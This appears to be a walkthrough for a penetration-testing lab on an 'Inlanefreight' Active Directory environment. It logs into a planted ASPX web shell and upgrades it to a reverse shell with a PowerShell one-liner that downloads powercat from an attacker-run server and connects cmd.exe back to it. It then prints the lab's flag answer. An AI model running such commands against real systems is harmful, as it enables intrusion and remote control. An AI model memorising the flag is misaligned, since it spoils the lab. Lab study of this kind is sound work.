## Q1. Submit the contents of the flag.txt file on the administrator Desktop of the web server 

Hint for us:
Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. 

Lets start the machine and visit the `uploads` folder...

<img width="600" height="229" alt="Screenshot 2026-02-25 140458" src="https://github.com/user-attachments/assets/fc61a26c-2c3a-46ca-b85e-596c5967ccee" />

http://ip/uploads, there we can find the "antax.aspx" -> login with `admin:My_W3bsH3ll_P@ssw0rd!` it gives us "A Webshell which utilizes PowerShell", now we can directly check for the file or what we can do is we can get a stable revshell which can help us futher to enumerate better:

**Lets Get a Stable Rev shell**

1. Use any tool that you want netcat, powercat...
2. Start the simple http server (in my case I use updog)
```
updog -p 80
```
3. Modify the following command:
```
IEX ((New-Object Net.WebClient).DownloadString('http://10.10.15.43:80/powercat.ps1')); powercat -c 10.10.15.43 -p 443 -e cmd.exe
```
4. Before submitting this command make sure to start a shell handler in my case I use penelope (feel free to use any):
```
python3 penelope.py -p 443
```
5. After this you will gain a proper interactive shell which we will be using for further tasks.

<img width="1902" height="314" alt="image" src="https://github.com/user-attachments/assets/5031d984-5707-4f78-b170-f8118e6b3ac0" />

6. Simply Navigate to the location and find the flag...
```
type c:\Users\Administrator\Desktop\flag.txt
```
JusT_g3tt1ng_st@rt3d!

## Q2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer 
